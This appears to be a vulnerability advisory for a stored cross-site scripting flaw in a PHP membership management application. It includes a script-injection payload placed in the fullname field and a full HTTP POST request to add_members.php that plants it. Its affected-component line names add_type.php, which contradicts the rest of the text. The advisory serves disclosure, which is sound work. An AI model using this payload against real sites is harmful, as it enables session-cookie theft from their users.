
# Membership Management System in PHP - Stored Cross-Site Scripting (add_members parameter)

### Vendor Homepage:

> https://codeastro.com/

### Software Link:

> [Membership Management System in PHP](https://codeastro.com/membership-management-system-in-php-with-source-code/)

### Version:

> v 1.0

### Stored Cross-Site Scripting (XSS):

> A stored cross-site scripting (XSS) vulnerability has been identified in the add_members.php page of the MembershipM-PHP application. The vulnerability arises due to insufficient sanitization of user input in the fullname field, allowing an attacker to inject arbitrary JavaScript code that is subsequently stored on the server and executed in the context of users who view the affected member's details.

### Affected Components:

> add_type.php

### Steps to Reproduce:

1 . Submit the Malicious Payload:
Using a POST request, submit the following payload in the fullname field: Hacker<IMG """><SCRIPT>alert(document.cookie)</SCRIPT>">

Example request:
POST /MembershipM-PHP%20(Updated)/MembershipM-PHP/add_members.php HTTP/1.1
Host: localhost
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrEtkNnKySGQ1XWmI

------WebKitFormBoundaryrEtkNnKySGQ1XWmI
Content-Disposition: form-data; name="fullname"

Hacker<IMG """><SCRIPT>alert(document.cookie)</SCRIPT>">
------WebKitFormBoundaryrEtkNnKySGQ1XWmI
(Other form fields omitted for brevity)

2. Trigger the XSS:

 Navigate to the page or section where the member's details are displayed.
 Upon viewing the member's details, the injected JavaScript will be executed in the context of the user's browser. In this case, an alert box displaying document.cookie will appear, demonstrating the ability to steal session cookies.


## Recommendation:

Input Validation: Implement robust input validation to ensure that any user input is properly sanitized. Disallow special characters that could be interpreted as HTML or JavaScript.
